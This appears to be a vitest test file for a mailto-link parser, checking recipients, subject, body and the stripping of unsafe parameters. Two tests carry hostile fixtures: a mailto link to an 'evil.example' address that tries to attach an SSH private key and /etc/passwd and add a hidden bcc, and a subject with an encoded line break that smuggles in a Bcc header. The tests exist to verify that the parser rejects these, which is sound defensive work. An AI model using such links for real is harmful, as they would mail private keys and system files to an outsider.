import { describe, expect, it } from "vitest";
import { parseMailto } from "./mailto";

describe("parseMailto", () => {
  it("reads the recipient, copy, subject and text", () => {
    expect(parseMailto("mailto:anna@shop.example?cc=ben@shop.example&subject=Order%2042&body=Hello%0D%0Athere")).toEqual({
      to: "anna@shop.example",
      cc: "ben@shop.example",
      subject: "Order 42",
      body: "Hello\nthere",
    });
  });

  it("drops attachments, hidden copies and extra headers", () => {
    const fields = parseMailto(
      "mailto:attacker@evil.example?subject=Invoice&attach=~/.ssh/id_ed25519&attachment=/etc/passwd&X-Mozilla-Attach=file:///home&bcc=spy@evil.example&In-Reply-To=x",
    );
    expect(fields).toEqual({ to: "attacker@evil.example", cc: "", subject: "Invoice", body: "" });
  });

  it("keeps a subject on one line, so it cannot add headers", () => {
    expect(parseMailto("mailto:a@b.example?subject=Hi%0D%0ABcc:%20spy@evil.example")?.subject).toBe("Hi Bcc: spy@evil.example");
  });

  it("joins several recipients and leaves out what is not an address", () => {
    expect(parseMailto("mailto:a@b.example,c@d.example?to=e@f.example&to=not-an-address")?.to).toBe("a@b.example, c@d.example, e@f.example");
  });

  it("keeps a plus sign in an address", () => {
    expect(parseMailto("mailto:leave+42@lists.example")?.to).toBe("leave+42@lists.example");
  });

  it("ignores links that are not mailto", () => {
    expect(parseMailto("https://example.com")).toBeNull();
  });
});
